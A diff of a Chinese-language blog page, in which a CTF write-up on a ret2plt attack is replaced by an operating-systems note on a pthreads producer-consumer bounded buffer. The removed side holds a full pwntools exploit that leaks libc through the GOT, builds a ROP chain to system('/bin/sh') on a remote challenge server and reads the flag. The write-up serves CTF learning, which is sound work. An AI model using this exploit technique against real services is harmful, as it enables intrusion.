@@ -13,22 +13,22 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://chihhhs.github.io/2024/08/09/pwn-6/"/>
+    <link rel="canonical" href="http://chihhhs.github.io/2024/09/26/os-bbuff/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Ret2plt 這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。   print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置 然後再用 readelf -s 找出並剪掉printf在libc中的offset，這樣我們就得到libc的">
+        <meta name="description" content="DEF Functions 共享記憶體的解決方案 (Share memory Solution) 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP3-WriteUp">
-<meta property="og:url" content="http://chihhhs.github.io/2024/08/09/pwn-6/index.html">
+<meta property="og:title" content="OS Bounded Buffer">
+<meta property="og:url" content="http://chihhhs.github.io/2024/09/26/os-bbuff/index.html">
 <meta property="og:site_name" content="Chihhh&#39;s Blog">
-<meta property="og:description" content="Ret2plt 這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。   print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置 然後再用 readelf -s 找出並剪掉printf在libc中的offset，這樣我們就得到libc的">
+<meta property="og:description" content="DEF Functions 共享記憶體的解決方案 (Share memory Solution) 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-08-09T08:07:00.000Z">
-<meta property="article:modified_time" content="2024-08-09T08:07:00.000Z">
+<meta property="article:published_time" content="2024-09-26T05:57:36.000Z">
+<meta property="article:modified_time" content="2024-09-26T05:57:36.000Z">
 <meta property="article:author" content="Chihhh">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="OS">
 <meta name="twitter:card" content="summary">
     
     
@@ -41,7 +41,7 @@
     
     <title>
         
-            ROP3-WriteUp -
+            OS Bounded Buffer -
         
         Chihhh&#39;s blog
     </title>
@@ -550,7 +550,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ROP3-WriteUp</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">OS Bounded Buffer</h1>
                 </div>
             
             </div>
@@ -571,15 +571,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-08-09 16:07</span>
-        <span class="mobile">2024-08-09 16:07</span>
+        <span class="desktop">2024-09-26 13:57:36</span>
+        <span class="mobile">2024-09-26 13:57:36</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-08-09 16:07</span>
-            <span class="mobile">2024-08-09 16:07</span>
+            <span class="desktop">2024-09-26 13:57:36</span>
+            <span class="mobile">2024-09-26 13:57:36</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -591,7 +591,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                        <a href="/tags/OS/">OS</a>&nbsp;
                     </li>
                 
             </ul>
@@ -617,15 +617,23 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h2 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h2><blockquote>
-<p>這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。</p>
-</blockquote>
-<ul>
-<li>print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置</li>
-<li>然後再用 <code>readelf -s</code> 找出並剪掉printf在libc中的offset，這樣我們就得到libc的base address</li>
-<li>再call回main overflow執行我們的rop chain就可以拿到shell了🥳</li>
-</ul>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop3&quot;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011f9</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">plt_print = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">name_buf = <span class="number">0x404060</span></span><br><span class="line">mainn= <span class="number">0x4011fe</span></span><br><span class="line">leave_ret = <span class="number">0x4011ef</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">p1 +=p64(ret)</span><br><span class="line">p1 += p64(pop_rdi)+p64(print_got)+p64(plt_print)</span><br><span class="line">p1 += p64(ret) + p64(mainn)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line">success (<span class="string">&#x27;libc -&gt; %s&#x27;</span> % <span class="built_in">hex</span>( l.address )) </span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>)),</span><br><span class="line">    ret,</span><br><span class="line">    l.sym.system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/`whoami`/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+            <h2 id="DEF-Functions"><a href="#DEF-Functions" class="headerlink" title="DEF Functions"></a>DEF Functions</h2><ol>
+<li><p>共享記憶體的解決方案 (Share memory Solution)<br> 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿 (not full)，另一個用於通知Buffer非空 (not empty)。</p>
+</li>
+<li><p>生產者 (Producer)<br> 生產者的工作是將數據放入Buffer中，當Buffer滿時，它會等待消費者取走一些數據以騰出空間。</p>
+</li>
+<li><p>消費者 (Consumer)<br> 消費者的工作是從Buffer中取出數據，當Buffer為空時，它會等待生產者放入新的數據。</p>
+</li>
+<li><p>Main Funtion</p>
+<ol>
+<li>初始化 mutex</li>
+<li><code>pthread_t prod_thread, cons_thread;</code> 保存新建 Thread ID , 創建生產者跟消費者 Thread</li>
+<li>等待 Thread 完成</li>
+<li>釋放它們佔用的資源 (destory)</li>
+</ol>
+</li>
+</ol>
+<h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// 緩衝區大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//隨機生成item</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//如果緩衝區已滿，等待not_full條件</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
         </div>
 
@@ -633,18 +641,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> ROP3-WriteUp</li>
+        <li><strong>Title:</strong> OS Bounded Buffer</li>
         <li><strong>Author:</strong> Chihhh Linnn</li>
         <li><strong>Created at
-                :</strong> 2024-08-09 16:07:00</li>
+                :</strong> 2024-09-26 13:57:36</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-08-09 16:07:00
+                    :</strong> 2024-09-26 13:57:36
             </li>
         
         <li>
-            <strong>Link:</strong> http://chihhhs.github.io/2024/08/09/pwn-6/
+            <strong>Link:</strong> http://chihhhs.github.io/2024/09/26/os-bbuff/
         </li>
         <li>
             <strong>
@@ -666,7 +674,7 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                        <a href="/tags/OS/">#OS</a>&nbsp;
                     </li>
                 
             </ul>
@@ -678,27 +686,27 @@
     <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦閱讀</span>
     </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/08/11/ncku/" title="NCKUCTF ret2libc_adv WriteUp" rel="bookmark">
-  <img src="/images/alena-aenami-new-year1k.jpg" alt="NCKUCTF ret2libc_adv WriteUp" class="!max-w-none">
-  <span class="title">NCKUCTF ret2libc_adv WriteUp</span>
-</a><a class="recommended-article-item" href="/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/" title="NCKUCTF ret2libc2024 WriteUp" rel="bookmark">
-  <img src="/images/alena-aenami-new-year1k.jpg" alt="NCKUCTF ret2libc2024 WriteUp" class="!max-w-none">
-  <span class="title">NCKUCTF ret2libc2024 WriteUp</span>
-</a><a class="recommended-article-item" href="/2024/08/09/pwn-4/" title="ROP WriteUp" rel="bookmark">
-  <img src="/images/alena-aenami-new-year1k.jpg" alt="ROP WriteUp" class="!max-w-none">
-  <span class="title">ROP WriteUp</span>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/08/05/pwn-1/" title="Yuawn bof WriteUp" rel="bookmark">
+  <img src="/images/alena-aenami-new-year1k.jpg" alt="Yuawn bof WriteUp" class="!max-w-none">
+  <span class="title">Yuawn bof WriteUp</span>
+</a><a class="recommended-article-item" href="/2024/05/09/nttu-csclub-pwn/" title="NTTU CSclube pwn part 1." rel="bookmark">
+  <img src="/images/alena-aenami-new-year1k.jpg" alt="NTTU CSclube pwn part 1." class="!max-w-none">
+  <span class="title">NTTU CSclube pwn part 1.</span>
+</a><a class="recommended-article-item" href="/2024/08/15/asm-1/" title="Assembly part 2." rel="bookmark">
+  <img src="/images/alena-aenami-new-year1k.jpg" alt="Assembly part 2." class="!max-w-none">
+  <span class="title">Assembly part 2.</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦閱讀</span>
    </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/08/11/ncku/" title="NCKUCTF ret2libc_adv WriteUp" rel="bookmark">
-  <img src="/images/alena-aenami-new-year1k.jpg" alt="NCKUCTF ret2libc_adv WriteUp" class="!max-w-none">
-  <span class="title">NCKUCTF ret2libc_adv WriteUp</span>
-</a><a class="recommended-article-item" href="/2024/08/16/ncku-ctf-ret2libc2024-WriteUp/" title="NCKUCTF ret2libc2024 WriteUp" rel="bookmark">
-  <img src="/images/alena-aenami-new-year1k.jpg" alt="NCKUCTF ret2libc2024 WriteUp" class="!max-w-none">
-  <span class="title">NCKUCTF ret2libc2024 WriteUp</span>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2024/08/05/pwn-1/" title="Yuawn bof WriteUp" rel="bookmark">
+  <img src="/images/alena-aenami-new-year1k.jpg" alt="Yuawn bof WriteUp" class="!max-w-none">
+  <span class="title">Yuawn bof WriteUp</span>
+</a><a class="recommended-article-item" href="/2024/05/09/nttu-csclub-pwn/" title="NTTU CSclube pwn part 1." rel="bookmark">
+  <img src="/images/alena-aenami-new-year1k.jpg" alt="NTTU CSclube pwn part 1." class="!max-w-none">
+  <span class="title">NTTU CSclube pwn part 1.</span>
 </a></div>
    </div>
   </div>
@@ -706,29 +714,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/08/10/AIS3-PreExam2024/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">AIS3 PreExam2024</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/08/09/pwn-5/"
+                        href="/2024/08/31/wireguard/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Stack Pivoting WriteUp</span>
+                                <span class="post-nav-title-item">Wireguard VPN</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -749,8 +742,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">ROP3-WriteUp</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ret2plt"><span class="nav-text">Ret2plt</span></a></li></ol>
+        <div class="page-title">OS Bounded Buffer</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DEF-Functions"><span class="nav-text">DEF Functions</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IMPL"><span class="nav-text">IMPL</span></a></li></ol></li></ol>
 
     </div>
 </div>
